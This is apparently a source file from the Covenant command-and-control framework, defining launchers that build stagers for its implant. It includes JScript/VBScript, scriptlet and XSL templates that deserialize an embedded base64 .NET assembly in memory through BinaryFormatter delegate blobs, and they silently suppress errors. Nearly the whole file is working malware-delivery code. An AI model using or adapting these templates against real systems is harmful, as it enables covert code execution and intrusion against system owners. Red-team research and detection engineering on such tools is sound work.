// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.ComponentModel.DataAnnotations.Schema;

using Newtonsoft.Json;
using Microsoft.CodeAnalysis;

using Covenant.Core;
using Covenant.Models.Grunts;
using Covenant.Models.Listeners;

namespace Covenant.Models.Launchers
{
    public enum LauncherType
    {
        Wmic,
        Regsvr32,
        Mshta,
        Cscript,
        Wscript,
        PowerShell,
        Binary,
        MSBuild,
        InstallUtil,
        ShellCode
    }

    public class Launcher
    {
        [Key, DatabaseGenerated(DatabaseGeneratedOption.Identity)]
        public int Id { get; set; }

        [Required(ErrorMessage = "Listener is required")]
        [Range(1, int.MaxValue, ErrorMessage = "Please select a valid Listener")]
        public int ListenerId { get; set; }

        [Required(ErrorMessage = "ImplantTemplate is required")]
        [Range(1, int.MaxValue, ErrorMessage = "Please select a valid ImplantTemplate")]
        public int ImplantTemplateId { get; set; }

        public string Name { get; set; } = "";
        public string Description { get; set; } = "";
        public LauncherType Type { get; set; } = LauncherType.Binary;
        public Common.DotNetVersion DotNetVersion { get; set; } = Common.DotNetVersion.Net35;

        // .NET Core options
        public Compiler.RuntimeIdentifier RuntimeIdentifier { get; set; } = Compiler.RuntimeIdentifier.win_x64;

        // Http Options
        public bool ValidateCert { get; set; } = false;
        public bool UseCertPinning { get; set; } = false;

        // Smb Options
        [Required(ErrorMessage = "SMB Pipe Name is required")]
        [StringLength(256, MinimumLength = 1, ErrorMessage = "SMB Pipe Name must be between 1 and 256 characters")]
        [RegularExpression(@"^[a-zA-Z0-9_\-\.]+$", ErrorMessage = "SMB Pipe Name can only contain letters, numbers, underscores, hyphens, and periods")]
        public string SMBPipeName { get; set; } = "gruntsvc";

        [Range(0, 86400, ErrorMessage = "Delay must be between 0 and 86400 seconds (24 hours)")]
        public int Delay { get; set; } = 5;

        [Range(0, 100, ErrorMessage = "Jitter must be between 0 and 100 percent")]
        public int JitterPercent { get; set; } = 10;

        [Range(1, int.MaxValue, ErrorMessage = "Connect Attempts must be at least 1")]
        public int ConnectAttempts { get; set; } = 5000;

        public DateTime KillDate { get; set; } = DateTime.Now.AddDays(30);
        public string LauncherString { get; set; } = "";
        public string StagerCode { get; set; } = "";

        [NotMapped, JsonIgnore, System.Text.Json.Serialization.JsonIgnore]
        public string Base64ILByteString
        {
            get
            {
                try
                {
                    string safePath = GetSafeLauncherPath();
                    if (string.IsNullOrEmpty(safePath) || !System.IO.File.Exists(safePath))
                    {
                        return "";
                    }
                    return Convert.ToBase64String(System.IO.File.ReadAllBytes(safePath));
                }
                catch (System.IO.IOException)
                {
                    return "";
                }
                catch (UnauthorizedAccessException)
                {
                    return "";
                }
            }
            set
            {
                if (string.IsNullOrEmpty(value))
                {
                    return;
                }

                string safePath = GetSafeLauncherPath();
                if (string.IsNullOrEmpty(safePath))
                {
                    throw new ArgumentException("Invalid launcher name");
                }

                byte[] bytes;
                try
                {
                    bytes = Convert.FromBase64String(value);
                }
                catch (FormatException)
                {
                    throw new ArgumentException("Invalid Base64 string for launcher content");
                }

                System.IO.File.WriteAllBytes(safePath, bytes);
            }
        }

        private string GetSafeLauncherPath()
        {
            if (string.IsNullOrEmpty(Name))
            {
                return null;
            }

            // Sanitize name to prevent path traversal
            string safeName = System.IO.Path.GetFileName(Name);
            if (string.IsNullOrEmpty(safeName) || safeName != Name)
            {
                return null; // Name contained path separators
            }

            string fullPath = System.IO.Path.Combine(Common.CovenantLauncherDirectory, safeName);

            // Verify the path is within the launcher directory
            string normalizedPath = System.IO.Path.GetFullPath(fullPath);
            string normalizedDir = System.IO.Path.GetFullPath(Common.CovenantLauncherDirectory);

            if (!normalizedPath.StartsWith(normalizedDir, StringComparison.OrdinalIgnoreCase))
            {
                return null; // Path traversal attempt
            }

            return fullPath;
        }

        public virtual string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template) { return ""; }
        public virtual string GetHostedLauncher(Listener listener, HostedFile hostedFile) { return ""; }

        public OutputKind OutputKind { get; set; } = OutputKind.DynamicallyLinkedLibrary;
        public bool CompressStager { get; set; } = false;
    }

    public abstract class DiskLauncher : Launcher
    {
        public string DiskCode { get; set; }
    }

    public enum ScriptingLanguage
    {
        JScript,
        VBScript
    }

    public enum ScriptletType
    {
        Plain,
        Scriptlet,
        TaggedScript,
        Stylesheet
    }

    public abstract class ScriptletLauncher : DiskLauncher
    {
        public ScriptingLanguage ScriptLanguage { get; set; } = ScriptingLanguage.JScript;
        public string ProgId { get; set; } = Utilities.CreateSecureGuid().ToString();

        protected ScriptletType ScriptType { get; set; } = ScriptletType.Scriptlet;

        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
        {
            this.StagerCode = StagerCode;
            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);

            // Credit DotNetToJscript (tyranid - James Forshaw)
            // Decode the front delegate template
            byte[] frontBytes = Convert.FromBase64String(FrontBinaryFormattedDelegate);

            // CRITICAL: Patch the array length in the serialized data
            // The FrontBinaryFormattedDelegate ends with an ArraySinglePrimitive header:
            // [0x0F][ObjectId:4bytes][Length:4bytes][ElementType:1byte]
            // The length field is at position (length - 5) to (length - 2)
            // We must patch it to match the actual StagerAssembly size
            int lengthPosition = frontBytes.Length - 5;
            byte[] assemblyLengthBytes = BitConverter.GetBytes(StagerAssembly.Length);
            frontBytes[lengthPosition] = assemblyLengthBytes[0];
            frontBytes[lengthPosition + 1] = assemblyLengthBytes[1];
            frontBytes[lengthPosition + 2] = assemblyLengthBytes[2];
            frontBytes[lengthPosition + 3] = assemblyLengthBytes[3];

            // Now concatenate: patched front + assembly bytes + end
            byte[] serializedDelegate = frontBytes.Concat(StagerAssembly).Concat(Convert.FromBase64String(EndBinaryFormattedDelegate)).ToArray();

            // Store actual byte length BEFORE any padding - this is critical for deserialization
            int actualByteLength = serializedDelegate.Length;

            int ofs = serializedDelegate.Length % 3;
            if (ofs != 0)
            {
                int length = serializedDelegate.Length + (3 - ofs);
                Array.Resize(ref serializedDelegate, length);
            }
            string base64Delegate = Convert.ToBase64String(serializedDelegate);

            string language = "";
            string code = "";
            if (this.ScriptLanguage == ScriptingLanguage.JScript)
            {
                // JScript: use single string (like the working GadgetToJScript example)
                code = JScriptTemplate.Replace(Environment.NewLine, "\r\n")
                    .Replace("{{REPLACE_GRUNT_IL_BYTE_STRING}}", base64Delegate)
                    .Replace("{{REPLACE_BYTE_LENGTH}}", actualByteLength.ToString());
                language = "JScript";
            }
            else if(this.ScriptLanguage == ScriptingLanguage.VBScript)
            {
                // VBScript: use single string
                code = VBScriptTemplate.Replace(Environment.NewLine, "\r\n")
                    .Replace("{{REPLACE_GRUNT_IL_BYTE_STRING}}", base64Delegate)
                    .Replace("{{REPLACE_BYTE_LENGTH}}", actualByteLength.ToString());
                if (this.ScriptType == ScriptletType.Stylesheet)
                {
                    code = "<![CDATA[\r\n" + code + "\r\n]]>";
                }
                language = "VBScript";
            }

            if (this.ScriptType == ScriptletType.Plain)
            {
                this.DiskCode = code;
            }
            else if (this.ScriptType == ScriptletType.Scriptlet || this.ScriptType == ScriptletType.TaggedScript)
            {
				string TaggedScript = TaggedScriptTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_SCRIPT_LANGUAGE}}", language);
				TaggedScript = TaggedScript.Replace("{{REPLACE_SCRIPT}}", code);
                if (this.ScriptType == ScriptletType.TaggedScript)
                {
                    this.DiskCode = TaggedScript;
                }
                else
                {
                    this.DiskCode = ScriptletCodeTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_TAGGED_SCRIPT}}", TaggedScript).Replace("{{REPLACE_PROGID}}", this.ProgId);
                }
            }
            else if (this.ScriptType == ScriptletType.Stylesheet)
            {
				this.DiskCode = StylesheetCodeTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_SCRIPT_LANGUAGE}}", language);
                this.DiskCode = DiskCode.Replace("{{REPLACE_SCRIPT}}", code);
            }

            if (this.DotNetVersion == Common.DotNetVersion.Net35)
            {
                this.DiskCode = this.DiskCode.Replace("{{REPLACE_VERSION_SETTER}}", "");
            }
            else if (this.DotNetVersion == Common.DotNetVersion.Net45 || this.DotNetVersion == Common.DotNetVersion.Net48)
            {
                this.DiskCode = this.DiskCode.Replace("{{REPLACE_VERSION_SETTER}}", JScriptNet45VersionSetter);
            }
            return GetLauncher();
        }

        protected abstract string GetLauncher();

        // Super ghetto - BinaryFormatter cannot seralize a Delegate in dotnet core. Instead, using a
        // raw, previously binary-formatted Delegate created in dotnet framework, and replacing the assembly bytes.
        protected static string FrontBinaryFormattedDelegate = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyBAAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDAHbWV0aG9kMQMHAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkCAAAACQMAAAAJBAAAAAkFAAAABAIAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGBgAAANoBU3lzdGVtLkNvbnZlcnRlcmAyW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GBwAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGCAAAAAd0YXJnZXQwCQcAAAAGCgAAABpTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseQYLAAAABExvYWQJDAAAAA8DAAAAACQAAAI=";
        protected static string EndBinaryFormattedDelegate = "BAQAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQsAAAAJBwAAAAkKAAAABhAAAAAvU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10sIEJ5dGVbXSkGEQAAAD1TeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKFN5c3RlbS5CeXRlW10sIFN5c3RlbS5CeXRlW10pCAAAAAoBBQAAAAQAAAAGEgAAAAhUb1N0cmluZwkHAAAABhQAAAAOU3lzdGVtLkNvbnZlcnQGFQAAACVTeXN0ZW0uU3RyaW5nIFRvU3RyaW5nKFN5c3RlbS5PYmplY3QpBhYAAAAlU3lzdGVtLlN0cmluZyBUb1N0cmluZyhTeXN0ZW0uT2JqZWN0KQgAAAAKAQwAAAACAAAABhcAAAAvU3lzdGVtLlJ1bnRpbWUuUmVtb3RpbmcuTWVzc2FnaW5nLkhlYWRlckhhbmRsZXIJBwAAAAoJBwAAAAkUAAAACRIAAAAKCw==";

        protected static String TaggedScriptTemplate =
@"<script language=""{{REPLACE_SCRIPT_LANGUAGE}}"">
{{REPLACE_SCRIPT}}
</script>";
        protected static String ScriptletCodeTemplate =
@"<scriptlet>
    <registration progid=""{{REPLACE_PROGID}}"">
        {{REPLACE_TAGGED_SCRIPT}}
    </registration>
</scriptlet>";
        private static String StylesheetCodeTemplate =
@"<stylesheet xmlns=""http://www.w3.org/1999/XSL/Transform"" xmlns:ms=""urn:schemas-microsoft-com:xslt"" xmlns:user=""blah"" version=""1.0"">
    <ms:script implements-prefix=""user"" language=""{{REPLACE_SCRIPT_LANGUAGE}}"">
{{REPLACE_SCRIPT}}
    </ms:script>
</stylesheet>";
        protected static String JScriptTemplate =
@"var manifestXML = '<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?><assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1""><assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />'+
'<clrClass clsid=""{9E28EF95-9C6F-3A00-B525-36A76178CC9C}"" progid=""System.Text.ASCIIEncoding"" threadingModel=""Both"" name=""System.Text.ASCIIEncoding"" runtimeVersion=""v4.0.30319"" />'+
'<clrClass clsid=""{C1ABB475-F198-39D5-BF8D-330BC7189661}"" progid=""System.Security.Cryptography.FromBase64Transform"" threadingModel=""Both"" name=""System.Security.Cryptography.FromBase64Transform"" runtimeVersion=""v4.0.30319"" />'+
'<clrClass clsid=""{F5E692D9-8A87-349D-9657-F96E5799D2F4}"" progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" />'+
'<clrClass clsid=""{50369004-DB9A-3A75-BE7A-1D0EF017B9D3}"" progid=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" runtimeVersion=""v4.0.30319"" />'+
'<clrClass clsid=""{6896B49D-7AFB-34DC-934E-5ADD38EEEE39}"" progid=""System.Collections.ArrayList"" threadingModel=""Both"" name=""System.Collections.ArrayList"" runtimeVersion=""v4.0.30319"" /></assembly>';

var actObj = new ActiveXObject(""Microsoft.Windows.ActCtx"");
actObj.ManifestText = manifestXML;

function Base64ToStream(b, byteLen) {
    var enc = actObj.CreateObject(""System.Text.ASCIIEncoding"");
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = actObj.CreateObject(""System.Security.Cryptography.FromBase64Transform"");
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = actObj.CreateObject(""System.IO.MemoryStream"");
    ms.Write(ba, 0, byteLen);
    ms.Position = 0;
    return ms;
}

{{REPLACE_VERSION_SETTER}}
var serialized_obj = ""{{REPLACE_GRUNT_IL_BYTE_STRING}}"";

try {
    var stream = Base64ToStream(serialized_obj, {{REPLACE_BYTE_LENGTH}});
    var formatter = actObj.CreateObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    var array = actObj.CreateObject('System.Collections.ArrayList');
    var d = formatter.Deserialize_2(stream);
    array.Add(undefined);
    var asm = d.DynamicInvoke(array.ToArray());
    var o = asm.CreateInstance('GruntStager.GruntStager');
} catch(e) {}";
        protected static string JScriptNet45VersionSetter = @"var shell = new ActiveXObject('WScript.Shell');
shell.Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
";

        protected static String VBScriptTemplate =
@"Dim manifestXML, actObj
manifestXML = ""<?xml version=""""1.0"""" encoding=""""UTF-16"""" standalone=""""yes""""?>"" & _
""<assembly manifestVersion=""""1.0"""" xmlns=""""urn:schemas-microsoft-com:asm.v1"""">"" & _
""<assemblyIdentity name=""""mscorlib"""" version=""""4.0.0.0"""" publicKeyToken=""""B77A5C561934E089"""" />"" & _
""<clrClass clsid=""""{9E28EF95-9C6F-3A00-B525-36A76178CC9C}"""" progid=""""System.Text.ASCIIEncoding"""" threadingModel=""""Both"""" name=""""System.Text.ASCIIEncoding"""" runtimeVersion=""""v4.0.30319"""" />"" & _
""<clrClass clsid=""""{C1ABB475-F198-39D5-BF8D-330BC7189661}"""" progid=""""System.Security.Cryptography.FromBase64Transform"""" threadingModel=""""Both"""" name=""""System.Security.Cryptography.FromBase64Transform"""" runtimeVersion=""""v4.0.30319"""" />"" & _
""<clrClass clsid=""""{F5E692D9-8A87-349D-9657-F96E5799D2F4}"""" progid=""""System.IO.MemoryStream"""" threadingModel=""""Both"""" name=""""System.IO.MemoryStream"""" runtimeVersion=""""v4.0.30319"""" />"" & _
""<clrClass clsid=""""{50369004-DB9A-3A75-BE7A-1D0EF017B9D3}"""" progid=""""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"""" threadingModel=""""Both"""" name=""""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"""" runtimeVersion=""""v4.0.30319"""" />"" & _
""<clrClass clsid=""""{6896B49D-7AFB-34DC-934E-5ADD38EEEE39}"""" progid=""""System.Collections.ArrayList"""" threadingModel=""""Both"""" name=""""System.Collections.ArrayList"""" runtimeVersion=""""v4.0.30319"""" />"" & _
""</assembly>""

Set actObj = CreateObject(""Microsoft.Windows.ActCtx"")
actObj.ManifestText = manifestXML

Function Base64ToStream(b, byteLen)
    Dim enc, length, ba, transform, ms
    Set enc = actObj.CreateObject(""System.Text.ASCIIEncoding"")
    length = enc.GetByteCount_2(b)
    ba = enc.GetBytes_4(b)
    Set transform = actObj.CreateObject(""System.Security.Cryptography.FromBase64Transform"")
    ba = transform.TransformFinalBlock(ba, 0, length)
    Set ms = actObj.CreateObject(""System.IO.MemoryStream"")
    ms.Write ba, 0, byteLen
    ms.Position = 0
    Set Base64ToStream = ms
End Function

{{REPLACE_VERSION_SETTER}}
On Error Resume Next
Dim s
s = ""{{REPLACE_GRUNT_IL_BYTE_STRING}}""

Dim formatter, arr, d, asm, o
Set formatter = actObj.CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
Set arr = actObj.CreateObject(""System.Collections.ArrayList"")
arr.Add Empty

Set d = formatter.Deserialize_2(Base64ToStream(s, {{REPLACE_BYTE_LENGTH}}))
Set asm = d.DynamicInvoke(arr.ToArray())
Set o = asm.CreateInstance(""GruntStager.GruntStager"")";
        protected static String VBScriptNet45VersionSetter = @"Dim shell
Set shell = CreateObject(""WScript.Shell"")
shell.Environment(""Process"")(""COMPLUS_Version"") = ""v4.0.30319""
";
    }
}
